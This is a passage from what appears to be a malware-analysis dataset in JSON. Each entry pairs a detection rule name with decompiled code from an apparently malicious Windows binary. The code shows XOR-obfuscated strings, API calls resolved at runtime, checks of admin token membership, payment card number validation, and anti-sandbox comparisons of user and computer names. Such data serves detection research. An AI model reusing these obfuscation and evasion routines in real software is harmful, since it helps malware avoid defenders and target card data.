0xe05926) {\n                var_8h = 6;\n                *(iVar3 + iVar6) = *(&var_14h + iVar3 % 6) ^ (iVar3 + iVar6)[&var_28h - iVar6];\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < 0x12);\n        uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n        *0x41db00 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    }\n    (**0x41db00)(&var_4h, 4);\n    if (var_4h < 0) {\n        var_4h = -var_4h;\n    }\n    iVar6 = var_4h;\n    uVar1 = (*pcVar5)(0, iVar2);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    return iVar6;\n}\n",
        "token_count": 894
    },
    "004079ed": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004079ed(void)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    code *pcVar7;\n    int32_t iVar8;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uchar var_44h;\n    uchar var_43h;\n    uchar var_42h;\n    uchar var_41h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    code *var_18h;\n    int32_t lpModuleName;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_40h = 0x23101c5e;\n    var_3ch._0_2_ = 0x5950;\n    var_3ch._2_1_ = 0x4a;\n    var_3ch._3_1_ = 0x50;\n    var_38h._0_1_ = 99;\n    var_38h._1_1_ = 0x51;\n    var_38h._2_2_ = 0x1559;\n    var_34h._0_1_ = 0x62;\n    var_30h = 0x4d627935;\n    var_2ch._0_2_ = CONCAT11(var_2ch._1_1_, 0x35);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_8h = 5;\n    iVar8 = 0;\n    lpModuleName = iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n        if (iVar4 != 0x2d0487) {\n            *(iVar8 + iVar3) = *(&var_30h + iVar8 % var_8h) ^ (iVar8 + iVar3)[&var_40h - iVar3];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xd);\n    var_40h = 0x3238312f;\n    var_3ch._0_2_ = 0x3111;\n    var_10h = 6;\n    var_3ch._2_1_ = 6;\n    var_3ch._3_1_ = 0x35;\n    var_38h._0_1_ = 0x17;\n    var_38h._1_1_ = 0x56;\n    var_30h = 0x56565869;\n    var_2ch._0_2_ = 0x4550;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    var_20h = &var_40h - iVar3;\n    var_1ch = iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetFocus)();\n        if (iVar4 != 0x4ebf75) {\n            *(iVar8 + iVar3) = *(&var_30h + iVar8 % var_10h) ^ (iVar8 + iVar3)[&var_40h - iVar3];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 10);\n    var_50h = 0xd3d1672;\n    var_4ch = 0x3b3c590a;\n    var_20h = 1;\n    var_48h = 0xe740f01;\n    var_44h = 0x3d;\n    var_43h = 2;\n    var_42h = 0x2a;\n    var_41h = 0x35;\n    var_28h = 0x6f527a35;\n    var_24h._0_1_ = 0x6b;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar3 = lpModuleName;\n    iVar4 = 0;\n    var_18h = &var_50h - iVar8;\n    var_30h = iVar8;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetFocus)();\n        if (iVar5 != 0x651a28) {\n            *(iVar4 + iVar8) = *(&var_28h + iVar4 % var_8h) ^ (iVar4 + iVar8)[var_18h];\n        }\n        pcVar6 = _sym.imp.KERNEL32.dll_GetModuleHandleA;\n        iVar4 = iVar4 + 1;\n    } while (iVar4 < 0x10);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar3, iVar8);\n    var_18h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    uVar2 = (*pcVar6)(iVar3, var_1ch);\n    pcVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    iVar1 = (*pcVar6)(var_4h);\n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar1 == 0) {\n        iVar1 = (*var_18h)(var_4h);\n        if (iVar1 == 0) {\n            var_50h = 0x34273928;\n            var_4ch = 0x312e190b;\n            var_48h = 0x1a1e172c;\n            var_44h = 2;\n            var_43h = 0x14;\n            var_42h = 0x48;\n            var_3ch._0_2_ = 0x556f;\n            var_3ch._2_1_ = 0x48;\n            var_3ch._3_1_ = 0x56;\n            var_38h._0_1_ = 0x6a;\n            var_38h._1_1_ = 0x75;\n            uVar2 = (*pcVar6)(8, 0x10);\n            pcVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            iVar3 = 0;\n            var_28h = &var_50h - pcVar6;\n            var_18h = pcVar6;\n            do {\n                iVar8 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n                if (iVar8 != 0x8ba13d) {\n                    pcVar6[iVar3] = *(&var_3ch + iVar3 % var_10h) ^ (pcVar6 + iVar3)[var_28h];\n                }\n                iVar3 = iVar3 + 1;\n            } while (iVar3 < 0xf);\n            var_3ch._0_2_ = 0x5637;\n            var_3ch._2_1_ = 0x28;\n            var_3ch._3_1_ = 0xc;\n            var_38h._0_1_ = 0x39;\n            var_38h._1_1_ = 0x19;\n            var_38h._2_2_ = 0xd5f;\n            var_34h._0_1_ = 0x4d;\n            var_10h = 0x4d4c3276;\n            var_ch._0_1_ = 0x4d;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 10);\n            iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            iVar4 = 0;\n            var_28h = &var_3ch - iVar8;\n            do {\n                iVar5 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n                iVar3 = lpModuleName;\n                if (iVar5 != 0xb56742) {\n                    *(iVar4 + iVar8) = *(&var_10h + iVar4 % var_8h) ^ (iVar4 + iVar8)[&var_3ch - iVar8];\n                }\n                iVar4 = iVar4 + 1;\n            } while (iVar4 < 9);\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar8);\n            pcVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar3, var_18h);\n            pcVar7 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n            (*pcVar7)(var_4h);\n            (*pcVar6)(var_4h);\n            pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n            pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            uVar2 = (*pcVar6)(0, var_18h);\n            (*pcVar7)(uVar2);\n            iVar8 = var_30h;\n            goto code_r0x00407ccd;\n        }\n    }\n    var_20h = 0;\ncode_r0x00407ccd:\n    uVar2 = (*pcVar6)(0, iVar8);\n    pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar6)(0, var_1ch);\n    (*pcVar7)(uVar2);\n    uVar2 = (*pcVar6)(0, iVar3);\n    (*pcVar7)(uVar2);\n    return var_20h;\n}\n",
        "token_count": 2345
    },
    "004013dd": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004013dd(uint param_1)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint pSid;\n    uint pIdentifierAuthority;\n    uint var_ch;\n    int32_t nSize;\n    uint32_t cbSid;\n    \n    *0x41da9c = param_1;\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    *0x41daa8 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n    *0x41daa0 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    fcn.0040862e();\n    fcn.00401374();\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x20);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    *0x41dac4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    if (*0x41dac4 != 0) {\n        nSize = 0x10;\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetComputerNameW)(*0x41dac4, &nSize);\n        if (iVar4 == 0) {\n            var_24h = 0x32144e1b;\n            var_20h = 0x4e007421;\n            var_1ch = 0x743d3215;\n            var_18h._0_2_ = 0x4e4e;\n            pIdentifierAuthority = 0x325a4e4e;\n            var_ch._0_2_ = 0x746a;\n            uVar3 = (*pcVar2)(8, 0x1d);\n            iVar4 = (*pcVar1)(uVar3);\n            iVar6 = 0;\n            do {\n                iVar5 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                if (iVar5 != 0xf92618) {\n                    cbSid = 6;\n                    *(iVar6 + iVar4) = *(&pIdentifierAuthority + iVar6 % 6) ^ (iVar6 + iVar4)[&var_24h - iVar4];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0xe);\n            (*_sym.imp.KERNEL32.dll_lstrcpyW)(*0x41dac4, iVar4);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        fcn.00401000();\n    }\n    var_ch._0_2_ = 0x500;\n    pIdentifierAuthority = 0;\n    cbSid = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                      (&pIdentifierAuthority, 2, 0x20, 0x220, 0, 0, 0, 0, 0, 0, &nSize);\n    pcVar1 = _sym.imp.ADVAPI32.dll_CheckTokenMembership;\n    if (cbSid != 0) {\n        iVar4 = (*_sym.imp.ADVAPI32.dll_CheckTokenMembership)(0, nSize, &cbSid);\n        cbSid = cbSid & -(iVar4 != 0);\n        (*_sym.imp.ADVAPI32.dll_FreeSid)(nSize);\n        if (cbSid != 0) {\n            if (*0x41daa8 < 6) {\n                return 0;\n            }\n            fcn.00401657();\n            goto code_r0x0040156e;\n        }\n    }\n    nSize = 0;\n    cbSid = 0xc;\n    nSize = (*_sym.imp.ADVAPI32.dll_CreateWellKnownSid)(0x27, 0, &pSid, &cbSid);\n    if (nSize != 0) {\n        (*pcVar1)(0, &pSid, &nSize);\n    }\ncode_r0x0040156e:\n    if (5 < *0x41daa8) {\n        fcn.00401587();\n    }\n    return 0;\n}\n",
        "token_count": 989
    },
    "004048bb": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004048bb(uchar *param_1)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    uint uVar3;\n    int16_t *piVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int16_t *piVar7;\n    uchar *puVar8;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uchar *var_4h;\n    \n    if (param_1 != NULL) {\n        puVar8 = param_1;\n        for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar8 = 0;\n            puVar8 = puVar8 + 1;\n        }\n        var_4h = param_1;\n        cVar2 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n        if (cVar2 == '\\x05') {\n            var_24h = 0x41276e20;\n            var_20h = 0x6e073055;\n            var_1ch = 0x3052413f;\n            var_18h = 0x412d6e01;\n            var_14h._0_2_ = 0x3033;\n            var_10h = 0x41486e73;\n            var_ch._0_2_ = 0x3033;\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n            piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar6 = 0;\n            do {\n                iVar5 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                if (iVar5 != 0x7f8c6a) {\n                    var_8h = 6;\n                    *(iVar6 + piVar4) = *(&var_10h + iVar6 % 6) ^ (iVar6 + piVar4)[&var_24h - piVar4];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x12);\n            piVar7 = piVar4;\n            do {\n                iVar1 = *piVar7;\n                *((var_4h - piVar4) + piVar7) = iVar1;\n                piVar7 = piVar7 + 1;\n            } while (iVar1 != 0);\n        }\n        else {\n            var_4ch = 0x521c6835;\n            var_48h = 0x731c6632;\n            var_44h = 0x68075425;\n            var_40h = 0x66315201;\n            var_3ch = 0x54137334;\n            var_38h = 0x52036816;\n            var_34h = 0x73096610;\n            var_30h = 0x68075426;\n            var_2ch = 0x663b523f;\n            var_28h = 0x5452731f;\n            var_10h = 0x52736866;\n            var_ch._0_2_ = CONCAT11(var_ch._1_1_, 0x54);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x51);\n            piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar6 = 0;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetInputState)();\n                if (iVar5 != 0xf0b43e) {\n                    var_8h = 5;\n                    *(iVar6 + piVar4) = *(&var_10h + iVar6 % 5) ^ (iVar6 + piVar4)[&var_4ch - piVar4];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x28);\n            piVar7 = piVar4;\n            do {\n                iVar1 = *piVar7;\n                *((var_4h - piVar4) + piVar7) = iVar1;\n                piVar7 = piVar7 + 1;\n            } while (iVar1 != 0);\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar4);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return;\n}\n",
        "token_count": 1100
    },
    "00401657": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint fcn.00401657(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint ReturnLength;\n    uint TokenInformation;\n    uint TokenHandle;\n    \n    TokenInformation = 0;\n    if (*0x41daa8 == 6) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x20008, &TokenHandle);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar1);\n        if (iVar2 != 0) {\n            (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 0x14, &TokenInformation, 4, &ReturnLength);\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n        }\n    }\n    return TokenInformation;\n}\n",
        "token_count": 176
    },
    "0040f779": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __cdecl fcn.0040f779(uint arg_8h, uint arg_ch, uint32_t *arg_10h, uint32_t *arg_14h)\n\n{\n    int32_t iVar1;\n    uint *in_EDX;\n    uint var_4h;\n    \n    do {\n        iVar1 = fcn.0040efd7(arg_8h, arg_ch, arg_10h, arg_14h, *in_EDX);\n        if (iVar1 != 6) break;\n    } while (*arg_14h <= *arg_10h && *arg_10h != *arg_14h);\n    if (iVar1 != 0) {\n        fcn.004052ed();\n    }\n    return iVar1;\n}\n",
        "token_count": 181
    },
    "004018c4": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.004018c4(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint8_t *extraout_ECX;\n    uint8_t *extraout_ECX_00;\n    uint8_t *extraout_ECX_01;\n    uint8_t *puVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    uint var_d0h;\n    uint var_cch;\n    uint pcbBuffer;\n    int32_t var_c4h;\n    int32_t var_c0h;\n    int32_t var_bch;\n    int32_t var_b8h;\n    int32_t var_b4h;\n    int32_t var_b0h;\n    int32_t var_ach;\n    int32_t var_a8h;\n    uint var_a4h;\n    int32_t var_a0h;\n    uint var_9ch;\n    int32_t var_98h;\n    uint var_94h;\n    int32_t var_90h;\n    uint var_8ch;\n    int32_t var_88h;\n    uint var_84h;\n    int32_t var_80h;\n    uint var_7ch;\n    int32_t var_78h;\n    uint var_74h;\n    int32_t var_70h;\n    uint var_6ch;\n    uint8_t var_68h;\n    uint var_67h;\n    uint var_62h;\n    uchar var_5dh;\n    uint32_t var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_49h;\n    uint var_45h;\n    uint var_41h;\n    int32_t var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    uint8_t *var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar4 = fcn.00401706();\n    if (iVar4 != 0) {\n        fcn.004018ac();\n    }\n    var_14h._0_1_ = 0x54;\n    var_14h._1_1_ = 0x36;\n    var_14h._2_2_ = 0x2237;\n    var_10h._0_1_ = 0xb;\n    var_10h._1_1_ = 0x5c;\n    var_10h._2_1_ = 0x24;\n    var_10h._3_1_ = 0x7e;\n    var_ch._0_1_ = 0x2e;\n    var_ch._1_1_ = 2;\n    var_ch._2_1_ = 0x5c;\n    var_ch._3_1_ = 0x54;\n    var_90h = 0x4a505430;\n    var_8ch._0_1_ = 0x6e;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    var_3ch = 5;\n    iVar11 = 0;\n    var_2ch = &var_14h - iVar4;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n        if (iVar6 != 0xd3b8cb) {\n            *(iVar11 + iVar4) = *(&var_90h + iVar11 % var_3ch) ^ (iVar11 + iVar4)[&var_14h - iVar4];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0xc);\n    iVar11 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar4);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar11 != 0) {\n        fcn.004018ac();\n    }\n    var_14h._0_1_ = 0x43;\n    var_14h._1_1_ = 8;\n    var_14h._2_2_ = 0x1c31;\n    var_10h._0_1_ = 1;\n    var_34h = 6;\n    var_10h._1_1_ = 6;\n    var_10h._2_1_ = 0x5c;\n    var_10h._3_1_ = 0x44;\n    var_ch._0_1_ = 0x3c;\n    var_ch._1_1_ = 0x15;\n    var_ch._2_1_ = 9;\n    var_ch._3_1_ = 0x6a;\n    var_a8h = 0x79586a30;\n    var_a4h._0_2_ = 0x6a65;\n    uVar5 = (*pcVar2)(8, 0xd);\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar6 = 0;\n    var_90h = iVar11;\n    var_2ch = &var_14h - iVar11;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_GetFocus)();\n        if (iVar7 != 0xa323e6) {\n            *(iVar6 + iVar11) = *(&var_a8h + iVar6 % var_34h) ^ (iVar6 + iVar11)[&var_14h - iVar11];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0xc);\n    iVar11 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar11);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar11 != 0) {\n        fcn.004018ac();\n    }\n    pcbBuffer = 0x400;\n    iVar11 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(0x41ddd0, &pcbBuffer);\n    if (iVar11 == 0) {\n        fcn.004018ac();\n    }\n    var_14h._0_1_ = 0x28;\n    var_14h._1_1_ = 0x1e;\n    var_14h._2_2_ = 0x203c;\n    var_10h._0_1_ = 0xd;\n    var_10h._1_1_ = 5;\n    var_10h._2_1_ = 0x1f;\n    var_10h._3_1_ = 0x1b;\n    var_ch._0_1_ = 0x21;\n    var_ch._1_1_ = 0xd;\n    var_ch._2_1_ = 0x19;\n    var_ch._3_1_ = 0x6b;\n    var_88h = 0x524e6b6b;\n    var_84h._0_1_ = 0x68;\n    uVar5 = (*pcVar2)(8, 0xd);\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar6 = 0;\n    var_a8h = iVar11;\n    var_2ch = &var_14h - iVar11;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar7 != 0x656e71) {\n            *(iVar6 + iVar11) = *(&var_88h + iVar6 % var_3ch) ^ (iVar6 + iVar11)[&var_14h - iVar11];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0xc);\n    iVar11 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41ddd0, iVar11);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar11 == 0) {\n        fcn.004018ac();\n    }\n    var_10h._0_1_ = 1;\n    var_10h._1_1_ = 0x36;\n    var_10h._2_1_ = 6;\n    var_10h._3_1_ = 0xf;\n    var_ch._0_1_ = 0x2b;\n    var_ch._1_1_ = 0x3d;\n    var_ch._2_1_ = 0x2f;\n    var_ch._3_1_ = 0x68;\n    var_80h = 0x6b685752;\n    var_7ch._0_1_ = 0x49;\n    uVar5 = (*pcVar2)(8, 9);\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar6 = 0;\n    var_88h = iVar11;\n    var_2ch = &var_10h - iVar11;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n        if (iVar7 != 0xb239ee) {\n            *(iVar6 + iVar11) = *(&var_80h + iVar6 % var_3ch) ^ (iVar6 + iVar11)[&var_10h - iVar11];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 8);\n    iVar11 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41ddd0, iVar11);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar11 == 0) {\n        fcn.004018ac();\n    }\n    pcbBuffer = 0x400;\n    iVar11 = (*_sym.imp.KERNEL32.dll_GetComputerNameA)(0x41ddd0, &pcbBuffer);\n    if (iVar11 == 0) {\n        fcn.004018ac();\n    }\n    var_10h._0_1_ = 0x30;\n    var_10h._1_1_ = 0xc;\n    var_10h._2_1_ = 0x17;\n    var_10h._3_1_ = 0x23;\n    var_ch._0_1_ = 0x31;\n    var_ch._1_1_ = 0x22;\n    var_ch._2_1_ = 0x3b;\n    var_ch._3_1_ = 0x4d;\n    var_a0h = 0x67594d63;\n    var_9ch._0_2_ = 0x6d73;\n    uVar5 = (*pcVar2)(8, 9);\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar6 = 0;\n    var_80h = iVar11;\n    var_2ch = &var_10h - iVar11;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar7 != 0x715fc8) {\n            *(iVar6 + iVar11) = *(&var_a0h + iVar6 % var_34h) ^ (iVar6 + iVar11)[&var_10h - iVar11];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 8);\n    iVar11 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41ddd0, iVar11);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar11 == 0) {\n        fcn.004018ac();\n    }\n    var_10h._0_1_ = 0x6e;\n    var_10h._1_1_ = 0x20;\n    var_10h._2_1_ = 7;\n    var_10h._3_1_ = 0x7a;\n    var_ch._0_1_ = 0x37;\n    var_ch._1_1_ = 0x10;\n    var_ch._2_1_ = 0x32;\n    var_ch._3_1_ = 0x4e;\n    var_8h = 0x364e7359;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x61);\n    uVar5 = (*pcVar2)(8, 9);\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar6 = 0;\n    var_a0h = iVar11;\n    var_2ch = &var_10h - iVar11;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n        if (iVar7 != 0xf930bc) {\n            *(iVar6 + iVar11) = *(&var_8h + iVar6 % var_3ch) ^ (iVar6 + iVar11)[&var_10h - iVar11];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 8);\n    iVar11 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41ddd0, iVar11);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar11 == 0) {\n        fcn.004018ac();\n    }\n    _var_5dh = CONCAT31(0x2b741b, var_5dh);\n    stack0xffffffa3 = 0x67121b71;\n    stack0xffffffa7 = 0x1608693c;\n    var_54h._3_1_ = 0x66;\n    var_50h._0_2_ = 0x673a;\n    var_50h._2_1_ = 5;\n    stack0xffffffaf = 0x7a306103;\n    var_49h = 0x660f02;\n    var_45h = 0x58363846;\n    var_41h._0_1_ = 0x79;\n    var_8h = 0x35793553;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x4c);\n    uVar5 = (*pcVar2)(8, 0x1d);\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar6 = 0;\n    var_2ch = &var_5ch - iVar11;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_CloseClipboard)();\n        if (iVar7 != 0x988e5e) {\n            *(iVar6 + iVar11) = *(&var_8h + iVar6 % var_3ch) ^ (iVar6 + iVar11)[&var_5ch - iVar11];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x1c);\n    var_1ch = 0x12004c1b;\n    var_18h = 0x1a772553;\n    var_14h._0_1_ = 9;\n    var_14h._1_1_ = 0x45;\n    var_14h._2_2_ = 0x501e;\n    var_10h._0_1_ = 1;\n    var_10h._1_1_ = 0x15;\n    var_10h._2_1_ = 0x5f;\n    var_10h._3_1_ = 0x27;\n    var_ch._0_1_ = 0x5b;\n    var_ch._1_1_ = 0x73;\n    var_8h = 0x66733548;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x36);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_c4h = &var_1ch - iVar6;\n    var_2ch = iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        puVar9 = extraout_ECX;\n        if (iVar8 != 0x5b5bc8) {\n            puVar9 = iVar7 + iVar6;\n            *puVar9 = *(&var_8h + iVar7 % var_3ch) ^ puVar9[&var_1ch - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x12);\n    cVar3 = fcn.004016aa(puVar9, puVar9);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (cVar3 == '\\0') {\n        fcn.004018ac();\n    }\n    var_8h = 0x767e740a;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x67);\n    var_28h = 0x5637394b;\n    var_24h._0_2_ = CONCAT11(var_24h._1_1_, 0x67);\n    uVar5 = (*pcVar2)(8, 6);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_c0h = &var_8h - iVar6;\n    var_c4h = iVar6;\n    do {\n        iVar8 = (*pcVar2)();\n        if (iVar8 != 0x5d46a9) {\n            *(iVar7 + iVar6) = *(&var_28h + iVar7 % var_3ch) ^ (iVar7 + iVar6)[var_c0h];\n        }\n        iVar7 = iVar7 + 